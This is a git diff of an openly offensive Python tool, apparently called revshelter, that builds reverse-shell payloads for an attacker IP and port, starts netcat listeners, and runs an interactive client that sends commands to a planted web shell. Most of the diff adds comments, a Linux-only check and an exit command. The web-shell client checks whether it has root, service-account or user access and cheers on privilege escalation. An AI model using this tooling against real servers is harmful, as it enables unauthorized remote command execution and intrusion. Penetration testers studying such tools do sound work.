@@ -11,7 +11,9 @@ import random
 import sys
 import requests
 
-# Defining xterm-256color for usage in the script. Compatible for linux only.
+if os.name.lower() == "nt":
+    aerr("Sorry!!! But this script could be run on Linux only.")
+# Defining xterm-256color for usage in the script. Compatible with linux only.
 bold = "\033[1m"
 green = "\033[32m"
 white = "\033[37m"
@@ -40,7 +42,7 @@ parser = argparse.ArgumentParser(description=f"""
 /____/_/ /_/\___/_/\__/\___/_/     
 
 {end}{bold}{red}To boldly catch shells even the size of a meteorite.      
-{end}{bold}{orange}Version: v1.1.1 - 09/04/21 - Bides Das @Xyan1d3 {end}""",formatter_class=argparse.RawTextHelpFormatter)
+{end}{bold}{orange}Version: v1.1.2 - 19/04/21 - Bides Das @Xyan1d3 {end}""",formatter_class=argparse.RawTextHelpFormatter)
 
 subparser = parser.add_subparsers(title="Available Modules", dest="module")
 rev = subparser.add_parser("rev",help="Revshell to clipboard")
@@ -163,32 +165,39 @@ def shell_cpy(language,ATTACKER_IP,ATTACKER_PORT): # This function takes attacke
     if language == "": # If the language parameter of this function is detected it will fallback to base64'ed bash.
         return payloads["bash"]
     return payloads[language] # Returns reverseshell payload from the dictionary by slapping in ATTACKERIP and ATTACKERPORT.
-def Invoke_Webshell(url):
-    try:
+def Invoke_Webshell(url): # This will invoke a webshell when a url with param is given like http://127.0.0.1/rev.php?cmd=
+    try:   # Here it checks wether the site is available or not
         r = requests.get(f"{url}")
-        if "404" in r.text or "Not Found" in r.text:
+        if "404" in r.text or "Not Found" in r.text: # Added check if the named site is not available which returns not found by webserver.
             aerr(f"Fatal Error : 404 Page not found.")
             exit()
-    except requests.ConnectionError:
+    except requests.ConnectionError: # If the site is unavailable it will return an 404.
         aerr(f"Fatal Error : 404 Page not found.")
         exit()
-    r = requests.get(f"{url}id")
-    uid = int(re.findall("[0-9]+",r.text)[0])
-    user = r.text.rstrip().split("(")[1].split(")")[0]
-    if "root" in user or uid == 0:
+    # We only reach here after the availablity check is complete.
+    # This means from here the site is available and we are ready to rock and roll.
+    r = requests.get(f"{url}id") # The webshell will issue id and the response isstored in r
+    uid = int(re.findall("[0-9]+",r.text)[0]) # We do some regex magic and grad out the uid and gid values seperately.
+    user = r.text.rstrip().split("(")[1].split(")")[0] # We take out the the username and primary group name here.
+    if "root" in user or uid == 0: # We check for root and then display a colourful messaage.
         ap(f"{red}{bold}root{bold}{purple}@{orange}{url.split('/')[2]}{end}{bold} WebShell opened.{end}")
+        ap(f"Wait!! What we are {red}{bold}root{end}")
     else:
-        if uid > 0 and uid < 1000 :
+        if uid > 0 and uid < 1000 : # We check for the account whether it is a service account. Generally service accounts have a uid gid from greater than 0 and less than 1000
             ap(f"{red}{bold}{user}{bold}{purple}@{orange}{url.split('/')[2]}{end}{bold}[{green}Service Account{end}] WebShell opened{end}.")
             ap("Good Luck!!! Happy Privilege Escation...")
-        elif uid > 1000:
+        elif uid > 1000: # We check for the account whether it is a Regular user of the box.
             ap(f"{red}{bold}{user}{bold}{purple}@{orange}{url.split('/')[2]}{end}{bold}[{green}Regular User{end}] WebShell opened{end}.")
             ap("Good Luck!!! Happy Privilege Escation...")
     while True:
-        cmd = input(f"{bold}{purple}rev{green}shelter> {end}{bold}{orange}")
+        cmd = input(f"{bold}{purple}rev{green}shelter> {end}{bold}{orange}") # Takes input from the user and sends the command to the user.
+        if cmd.lower() == "exit" or cmd.lower() == "quit": # Added the function to exit the webshell on entering quit or exit.
+            print()
+            ainfo("KTHXBYE!")
+            exit()
         print(f"{end}",end="")
-        r = requests.get(f"{url}{requests.utils.quote(cmd)}")
-        print(r.text.rstrip())
+        r = requests.get(f"{url}{requests.utils.quote(cmd)}") # It will send the url encoded command and url encoded to the url as a GET parameter.
+        print(r.text.rstrip()) # We print the response of the command on the screen while removing a extra trailling line sing rstrip.
         
 def shell_handler(port,proto): # shell_handler invokes a netcat listener it takes port to listen on and protocol UDP/TCP
     if proto.lower() == "tcp":
@@ -199,7 +208,7 @@ def shell_handler(port,proto): # shell_handler invokes a netcat listener it take
 
 
 
-if len(sys.argv) == 1:
+if len(sys.argv) == 1: # If no arguments are supplied then the this will print the arg parser help.
     parser.print_help()
 try:
     if args.module == "rev": # Checks for 1st pos arg if its rev.
@@ -267,6 +276,6 @@ try:
         # The url is prepared for doing whatever we want to do.
         Invoke_Webshell(args.url)
 
-except KeyboardInterrupt:
+except KeyboardInterrupt: # The whole program is in the try block with the error handling of ctrl-c and prints the KTHXBYE
     print()
-    ainfo("KTHXBYE!")
+    ainfo("KTHXBYE!") # This message is inspired from earlier version of https://github.com/byt3bl33d3r/CrackMapExec
